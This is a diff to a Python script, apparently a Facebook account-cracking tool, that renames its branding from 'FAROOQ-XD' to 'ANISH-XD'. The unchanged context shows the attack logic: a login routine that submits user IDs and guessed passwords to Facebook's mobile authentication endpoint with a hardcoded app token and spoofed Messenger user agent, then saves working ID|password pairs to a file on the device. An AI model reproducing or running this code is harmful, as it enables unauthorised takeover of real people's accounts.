@@ -95,7 +95,7 @@ elif bit == '32bit':
  print('\033[1;91m[\033[1;92m◉\033[1;91m] \033[1;92mYOU ARE 32BIT USER')
 
  #───────────────[BIT End]───────────────────────── #
-sys.stdout.write('\x1b]2; [😜FAROOQ-XD😜]\x07')
+sys.stdout.write('\x1b]2; [ANISH-XD]\x07')
 def clear():
     os.system('clear')
     print(logo)
@@ -112,8 +112,8 @@ logo=(""" \033[1;38m
 \033[1;36m        VERSION  : \033[1;36m 1.5
 
 \033[1;91m----------------------------------------------
-\033[1;37m OWNER    : FAROOQ BRAND
-\033[1;31m FACEBOOK : FAROOQ BRAND ••)
+\033[1;37m OWNER    : ANISH XD
+\033[1;31m FACEBOOK : ANISH XD ••)
 \033[1;97m GITHUB   : FAROOQ-XD 
 \033[1;92m WHATSAPP : 07668522681 \033[1;90m(FAROOQ)
 \033[1;92m WHATSAPP : 07668522681 \033[1;90m(FAROOQ)
@@ -134,7 +134,7 @@ R = '\033[1;91m';W = '\033[1;97m';G = '\033[1;32m';Y = '\033[1;33m';B = '\x1b[38
 loop, ok = 0, 0
 user = []
 #[===================LOGO======================]#
-sys.stdout.write('\x1b]2; [😜FAROOQ-XD🤪]\x07')
+sys.stdout.write('\x1b]2; [😜ANISH-XD🤪]\x07')
 logo=("""\033[1;37m
 
   ___   _   _ _____ _____ _   _ 
@@ -171,7 +171,7 @@ def animation(u):
 def linex():
     animation(f"\033[1;37m=====================================================\x1b[1;97m")
 #[===================UA-BOX======================]#
-def WASU():
+def ANISH():
     return "Dalvik/2.1.0 (Mozilla/5.0 (Linux; Android 13; M2101K6G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36) [FBAN/Orca-Android;FBAV/28.0.0.1.16;FBPN/com.facebook.orca;FBLC/th_TH;FBBV/6811796;FBCR/AIS;FBMF/samsung;FBBD/samsung;FBDV/SM-A720F;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]"
 #[===================MAIN-MENU======================]#
 def main():
@@ -245,20 +245,20 @@ def FBOLDIDSFUCKER(uid, pas, tl):
                     'content-type': 'application/x-www-form-urlencoded',
                     'Host': 'graph.facebook.com',
                     'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
-                    'user-agent': WASU(),
+                    'user-agent': ANISH(),
                     'accept-encoding': 'gzip, deflate',
                     'x-fb-http-engine': 'Liger'
                 }
                 url = "https://b-api.facebook.com/auth/login"
                 response = session.post(url, data=data, headers=head, verify=True).json()
                 if "access_token" in response:
-                    print(f"\n\033[1;32m[WASU-OK] \033[1;30m{uid} \033[1;31m•|• \033[1;32m{ps}")
-                    open("/sdcard/FAROOQ-XD.txt", "a").write(uid + "|" + ps + "\n")
+                    print(f"\n\033[1;32m[ANISH-OK] \033[1;30m{uid} \033[1;31m•|• \033[1;32m{ps}")
+                    open("/sdcard/ANISH-XD.txt", "a").write(uid + "|" + ps + "\n")
                     ok+=1
                     break
                 elif "www.facebook.com" in response.get("error", {}).get("message", ""):
                     print(f"\n\033[1;32m[WASU-OK] \033[1;30m{uid} \033[1;31m•|• \033[1;32m{ps}")                 
-                    open("/sdcard/FAROOQ-XD.txt", "a").write(uid + "|" + ps + "\n")
+                    open("/sdcard/ANISH-XD.txt", "a").write(uid + "|" + ps + "\n")
                     break
         loop+=1
     except Exception as e:
